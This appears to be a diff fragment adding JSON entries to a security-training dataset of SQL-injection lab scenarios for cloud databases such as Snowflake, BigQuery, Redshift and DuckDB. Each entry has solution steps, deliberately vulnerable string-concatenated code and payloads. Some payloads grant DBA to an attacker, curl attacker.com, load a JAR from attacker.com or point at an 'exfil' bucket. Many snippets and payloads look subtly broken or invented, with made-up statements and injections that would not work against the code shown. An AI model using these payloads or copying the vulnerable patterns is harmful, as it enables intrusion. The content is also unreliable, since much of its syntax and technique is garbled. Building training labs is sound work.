+                                "Inject through memory allocation parameters",
+                                "Bypass SGA validation checks",
+                                "Trigger buffer overflow conditions",
+                                "Execute privileged PL/SQL"
+                            ],
+                            "Vulnerability name": "Oracle Spatial Network Injection",
+                            "srcCode": "BEGIN SDO_NET.CREATE_NETWORK('\\'' + userParams + '\\''); END;",
+                            "payloads": [
+                                "network_name, 1000, 2000, 50, 2\") FROM user_sdo_networks--",
+                                "malicious_net')); EXECUTE IMMEDIATE 'GRANT DBA TO attacker'--"
+                            ]
+                        },
+                        {
+                            "Lab scenario": "SQL Injection in Snowflake External Table Refresh Paths",
+                            "Lab Description": "A cloud pipeline refreshes external tables with dynamically constructed storage paths without proper sanitization, allowing access to unauthorized storage locations.",
+                            "Difficulty Level": "Medium",
+                            "Solution Steps": [
+                                "Identify ALTER EXTERNAL TABLE REFRESH statements",
+                                "Inject through path parameters",
+                                "Bypass storage path validation",
+                                "Access sensitive cloud storage",
+                                "Poison metadata cache"
+                            ],
+                            "Vulnerability name": "Snowflake External Path Injection",
+                            "srcCode": "ALTER EXTERNAL TABLE ext_table REFRESH '\\'' + userPath + '\\''",
+                            "payloads": [
+                                "s3://legit/path') FROM information_schema.external_tables--",
+                                "azure://attacker/exfil')) LIST @~/staged"
+                            ]
+                        },
+                        {
+                            "Lab scenario": "SQL Injection in BigQuery Remote Model Connection Strings",
+                            "Lab Description": "A machine learning system dynamically constructs connection strings for remote models without proper sanitization, allowing Vertex AI endpoint manipulation.",
+                            "Difficulty Level": "Easy",
+                            "Solution Steps": [
+                                "Identify CREATE MODEL statements",
+                                "Inject through CONNECTION parameters",
+                                "Bypass IAM permission checks",
+                                "Redirect model predictions",
+                                "Execute arbitrary inference calls"
+                            ],
+                            "Vulnerability name": "BigQuery Model Connection Injection",
+                            "srcCode": "CREATE MODEL `project.model` REMOTE WITH CONNECTION `\\'' + userConn + '\\''",
+                            "payloads": [
+                                "us.my-connection') FROM `region-us`.INFORMATION_SCHEMA.ROUTINES--",
+                                "attacker-proj.us.conn` OPTIONS (endpoint='attacker.com')"
+                            ]
+                        },
+                        {
+                            "Lab scenario": "SQL Injection in Azure Synapse Spark Notebook Magic Parameters",
+                            "Lab Description": "An interactive notebook incorporates user input into magic command parameters without sanitization, allowing cross-language code execution.",
+                            "Difficulty Level": "Easy",
+                            "Solution Steps": [
+                                "Identify magic command usage (%sql, %python)",
+                                "Inject through parameter placeholders",
+                                "Bypass notebook sanitization",
+                                "Execute arbitrary code across languages",
+                                "Access linked cloud services"
+                            ],
+                            "Vulnerability name": "Synapse Magic Command Injection",
+                            "srcCode": "%sql SELECT * FROM table WHERE id = '\\'' + userParam + '\\''",
+                            "payloads": [
+                                "1' UNION SELECT * FROM sensitive_table--",
+                                "' || (SELECT TOP 1 name FROM sys.sql_logins) || '"
+                            ]
+                        },
+                        {
+                            "Lab scenario": "SQL Injection in Amazon Redshift ML Model Hyperparameters",
+                            "Lab Description": "A predictive analytics system dynamically constructs model hyperparameters without proper sanitization, allowing training data access.",
+                            "Difficulty Level": "Hard",
+                            "Solution Steps": [
+                                "Identify CREATE MODEL statements",
+                                "Inject through HPARAMETERS clause",
+                                "Bypass SageMaker validation",
+                                "Access training datasets",
+                                "Manipulate model behavior"
+                            ],
+                            "Vulnerability name": "Redshift ML Hyperparameter Injection",
+                            "srcCode": "CREATE MODEL model_name HPARAMETERS ('\\'' + userParams + '\\'') AS SELECT...",
+                            "payloads": [
+                                "max_depth=5') FROM svv_ml_models--",
+                                "objective='binary:logistic'))) FROM (SELECT * FROM pg_user)"
+                            ]
+                        },
+                        {
+                            "Lab scenario": "SQL Injection in Google Cloud Spanner Change Stream Value Capture",
+                            "Lab Description": "A CDC system dynamically configures change stream value capture types without proper sanitization, allowing data exfiltration.",
+                            "Difficulty Level": "Medium",
+                            "Solution Steps": [
+                                "Identify CREATE CHANGE STREAM statements",
+                                "Inject through VALUE_CAPTURE_TYPE parameter",
+                                "Bypass stream validation checks",
+                                "Access unauthorized change data",
+                                "Tamper with captured values"
+                            ],
+                            "Vulnerability name": "Spanner Value Capture Injection",
+                            "srcCode": "CREATE CHANGE STREAM stream FOR TABLE table_name VALUE_CAPTURE_TYPE '\\'' + userCapture + '\\''",
+                            "payloads": [
+                                "OLD_AND_NEW_VALUES) FROM information_schema.change_streams--",
+                                "NEW_VALUES'))) FOR ALL"
+                            ]
+                        },
+                        {
+                            "Lab scenario": "SQL Injection in Databricks Unity Catalog Sharing Recipients",
+                            "Lab Description": "A data sharing platform dynamically adds recipients to Delta Shares without proper sanitization, allowing ACL bypass.",
+                            "Difficulty Level": "Easy",
+                            "Solution Steps": [
+                                "Identify ALTER SHARE statements",
+                                "Inject through recipient email parameters",
+                                "Bypass email validation checks",
+                                "Access unauthorized shares",
+                                "Exfiltrate via sharing notifications"
+                            ],
+                            "Vulnerability name": "Unity Catalog Sharing Injection",
+                            "srcCode": "ALTER SHARE my_share ADD TO '\\'' + userEmail + '\\''",
+                            "payloads": [
+                                "attacker@domain.com') FROM system.information_schema.shares--",
+                                "legit@company.com'; SELECT * FROM hive_metastore.sensitive.tbl--"
+                            ]
+                        },
+                        {
+                            "Lab scenario": "SQL Injection in Snowpark Java UDF Class Paths",
+                            "Lab Description": "A Snowpark application dynamically specifies Java UDF classpaths without proper sanitization, allowing arbitrary code execution.",
+                            "Difficulty Level": "Easy",
+                            "Solution Steps": [
+                                "Identify CREATE FUNCTION statements",
+                                "Inject through IMPORTS clause",
+                                "Bypass JAR validation checks",
+                                "Load malicious Java classes",
+                                "Execute arbitrary code"
+                            ],
+                            "Vulnerability name": "Snowpark Java UDF Injection",
+                            "srcCode": "CREATE FUNCTION my_func() RETURNS STRING LANGUAGE JAVA IMPORTS = ('\\'' + userJar + '\\'')",
+                            "payloads": [
+                                "attacker.com/malicious.jar FROM information_schema.functions--",
+                                "s3://exfil/exploit.jar'))) HANDLER='MaliciousClass'"
+                            ]
+                        },
+                        {
+                            "Lab scenario": "SQL Injection in Azure Cosmos DB Stored Procedure Continuations",
+                            "Lab Description": "A NoSQL application dynamically constructs continuation tokens in stored procedures without proper sanitization, allowing pagination control.",
+                            "Difficulty Level": "Medium",
+                            "Solution Steps": [
+                                "Identify stored procedure execution",
+                                "Inject through continuationToken parameter",
+                                "Bypass query limits",
+                                "Access unauthorized partitions",
+                                "Exfiltrate via pagination"
+                            ],
+                            "Vulnerability name": "CosmosDB Continuation Injection",
+                            "srcCode": "function queryDocs(continuationToken) { var response = __.queryDocuments(\\'' + userQuery + '\\'', { continuation: '\\'' + userToken + '\\'' }); }",
+                            "payloads": [
+                                "attacker-token') FROM c WHERE c._ts > 0--",
+                                "malicious' })); function() { return __.queryDocuments(__.getSelfLink()) }--"
+                            ]
+                        },
+                        {
+                            "Lab scenario": "SQL Injection in Elasticsearch SQL ODBC Driver Properties",
+                            "Lab Description": "An analytics tool dynamically constructs ODBC connection properties without proper sanitization, allowing index access.",
+                            "Difficulty Level": "Easy",
+                            "Solution Steps": [
+                                "Identify ODBC connection strings",
+                                "Inject through Properties parameter",
+                                "Bypass driver validation checks",
+                                "Access restricted indices",
+                                "Exfiltrate via driver errors"
+                            ],
+                            "Vulnerability name": "Elasticsearch ODBC Property Injection",
+                            "srcCode": "Driver={{Elasticsearch ODBC}};Server='\\'' + userServer + '\\'';Properties='\\'' + userProps + '\\''",
+                            "payloads": [
+                                "attacker.com;UID=admin;PWD=' OR 1=1 --",
+                                "legit.com:9200\";SSL=1;SSLCertAuth=0;"
+                            ]
+                        },
+                        {
+                            "Lab scenario": "SQL Injection in Apache Druid SQL Identifier Case Forcing",
+                            "Lab Description": "A dashboard tool dynamically forces identifier casing without proper sanitization, allowing query manipulation.",
+                            "Difficulty Level": "Easy",
+                            "Solution Steps": [
+                                "Identify case manipulation",
+                                "Inject through case expressions",
+                                "Bypass parser validation checks",
+                                "Access system tables",
+                                "Execute native queries"
+                            ],
+                            "Vulnerability name": "Druid Case Forcing Injection",
+                            "srcCode": "SELECT * FROM '\\'' + userTable + '\\''",
+                            "payloads": [
+                                "datasource FROM (SELECT * FROM sys.segments) --",
+                                "SENSITIVE_DATA\" WHERE __time > 0) UNION SELECT 1 --"
+                            ]
+                        },
+                        {
+                            "Lab scenario": "SQL Injection in InfluxDB Flux HTTP Request Headers",
+                            "Lab Description": "A monitoring system dynamically constructs HTTP request headers in Flux without proper sanitization, allowing internal endpoint access.",
+                            "Difficulty Level": "Hard",
+                            "Solution Steps": [
+                                "Identify http.get/post calls",
+                                "Inject through header parameters",
+                                "Bypass header validation checks",
+                                "Access internal endpoints",
+                                "Exfiltrate via HTTP responses"
+                            ],
+                            "Vulnerability name": "Flux HTTP Header Injection",
+                              "srcCode": "import \"http\" http.get(url: 'url', headers: '\\'' + userHeaders + '\\'')",
+                              "payloads": [
+                                  "{'X-Auth': 'attacker'} FROM _internal.monitor--",
+                                  "{'Authorization': 'Bearer ${string(v: r._value)}'}"
+                              ]
+                        },
+                        {
+                            "Lab scenario": "SQL Injection in TimescaleDB Compression Segmentby Columns",
+                            "Lab Description": "A time-series database dynamically configures compression segment columns without proper sanitization, allowing data access.",
+                            "Difficulty Level": "Medium",
+                            "Solution Steps": [
+                                "Identify ALTER TABLE SET compression",
+                                "Inject through segmentby parameters",
+                                "Bypass column validation checks",
+                                "Access compressed chunks",
+                                "Manipulate compression ratios"
+                            ],
+                            "Vulnerability name": "Timescale Compression Injection",
+                            "srcCode": "ALTER TABLE hypertable SET (timescaledb.compress, timescaledb.compress_segmentby = '\\'' + userColumns + '\\'')",
+                            "payloads": [
+                                "device_id FROM _timescaledb_catalog.hypertable--",
+                                "time DESC')) WITH (compress_orderby = 'time DESC')"
+                            ]
+                        },
+                        {
+                            "Lab scenario": "SQL Injection in CockroachDB CDC Webhook Headers",
+                            "Lab Description": "A change data capture system dynamically constructs webhook headers without proper sanitization, allowing request manipulation.",
+                            "Difficulty Level": "Hard",
+                            "Solution Steps": [
+                                "Identify CREATE CHANGEFEED WITH webhook",
+                                "Inject through header parameters",
+                                "Bypass header validation checks",
+                                "Access webhook endpoints",
+                                "Exfiltrate via custom headers"
+                            ],
+                            "Vulnerability name": "Cockroach Webhook Header Injection",
+                            "srcCode": "CREATE CHANGEFEED FOR TABLE table INTO 'webhook-https://endpoint' WITH webhook_headers = '\\'' + userHeaders + '\\''",
+                            "payloads": [
+                                "'X-Auth: attacker'",
+                                "'{\"Authorization\": \"Bearer $(curl attacker.com)\"}'"
+                            ]
+                        },
+                        {
+                            "Lab scenario": "SQL Injection in DuckDB HTTPFS Extension Headers",
+                            "Lab Description": "A data pipeline dynamically configures HTTP request headers in DuckDB without proper sanitization, allowing credential theft.",
+                            "Difficulty Level": "Medium",
+                            "Solution Steps": [
+                                "Identify HTTPFS usage",
+                                "Inject through header parameters",
+                                "Bypass header validation checks",
+                                "Access restricted URLs",
+                                "Exfiltrate via server responses"
+                            ],
+                            "Vulnerability name": "DuckDB HTTPFS Header Injection",
+                            "srcCode": "SET http_headers = '\\'' + userHeaders + '\\''",
+                            "payloads": [
+                                "'Authorization: Basic YWRtaW46cGFzcw=='",
+                                "'X-Forwarded-For: 127.0.0.1'"
+                            ]
+                        },
+                        {
+                            "Lab scenario": "SQL Injection in Materialized View WITH NO DATA Clause",
+                            "Lab Description": "A data warehouse dynamically controls materialized view loading without proper sanitization, allowing data access.",
+                            "Difficulty Level": "Easy",
+                            "Solution Steps": [
+                                "Identify REFRESH MATERIALIZED VIEW",
+                                "Inject through WITH DATA parameter",
+                                "Bypass refresh validation checks",
+                                "Trigger full data reload",
+                                "Access underlying tables"
+                            ],
+                            "Vulnerability name": "Materialized View Refresh Injection",
+                            "srcCode": "REFRESH MATERIALIZED VIEW mv WITH ('\\'' + userOption + '\\'')",
+                            "payloads": [
+                                "DATA) FROM pg_matviews--",
+                                "NO DATA')) CONCURRENTLY"
+                            ]
+                        },
+                        {
+                            "Lab scenario": "SQL Injection in SQL Ledger History Retention",
+                            "Lab Description": "A blockchain application dynamically configures ledger retention without proper sanitization, allowing history tampering.",
+                            "Difficulty Level": "Hard",
+                            "Solution Steps": [
+                                "Identify ALTER LEDGER statements",
+                                "Inject through retention parameters",
+                                "Bypass blockchain validation checks",
+                                "Tamper with historical records",
+                                "Disable immutable logging"
+                            ],
+                            "Vulnerability name": "SQL Ledger Retention Injection",
+                            "srcCode": "ALTER LEDGER ledger SET (LEDGER_VIEW_RETENTION = '\\'' + userRetention + '\\'')",
+                            "payloads": [
+                                "INFINITE') FROM sys.ledger_blocks--",
+                                "0 DAYS'))) WITH (VERIFICATION = OFF)"
+                            ]
+                        }
+                    
+                    
+                
+  ]
